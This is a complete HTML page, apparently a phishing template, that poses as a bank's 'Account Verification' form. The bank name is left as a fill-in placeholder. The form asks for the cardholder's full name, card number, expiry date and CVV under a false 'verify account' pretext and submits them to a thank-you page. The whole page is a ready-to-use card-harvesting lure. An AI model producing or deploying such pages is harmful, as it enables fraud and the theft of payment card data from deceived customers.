<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Secure Details Submission | [Bank Name Here]</title>
    <style>
        body {
            font-family: 'Arial', sans-serif;
            background-color: #eef7ff;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .container {
            background-color: white;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
            max-width: 500px;
            width: 90%;
        }
        h1 {
            color: #0056b3;
            text-align: center;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 18px;
        }
        label {
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box; /* Includes padding in the width */
        }
        button {
            background-color: #ff9800; /* Orange/Yellow for action */
            color: white;
            padding: 15px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            width: 100%;
            font-size: 1.1em;
            transition: background-color 0.3s;
        }
        button:hover {
            background-color: #e68a00;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Account Verification</h1>
        <!-- ACTION is CRITICAL: This points to the destination for submission -->
        <form action="thankyou.html" method="GET"> 
            <p style="text-align: center; color: #dc3545;">Please provide your primary payment details below.</p>

            <!-- Name Field -->
            <div class="form-group">
                <label for="name">Full Name (As Printed on Card):</label>
                <input type="text" id="name" name="name" placeholder="John Doe" required>
            </div>

            <!-- Card Number Field -->
            <div class="form-group">
                <label for="cardNumber">Card Number:</label>
                <input type="text" id="cardNumber" name="card_number" placeholder="XXXX XXXX XXXX XXXX" pattern="\d{16}" required>
            </div>

            <!-- Expiry Field -->
            <div class="form-group">
                <label for="expiry">Expiry Date (MM/YY):</label>
                <input type="text" id="expiry" name="expiry" placeholder="12/28" pattern="(0[1-9]|1[0-2])\/\d{2}" required>
            </div>

            <!-- CVV Field -->
            <div class="form-group">
                <label for="cvv">CVV Code (3 or 4 Digits):</label>
                <input type="text" id="cvv" name="cvv" placeholder="123" pattern="\d{3,4}" required>
            </div>

            <!-- Submit Button -->
            <button type="submit">Submit Details & Verify Account</button>
        </form>
    </div>
</body>
</html>
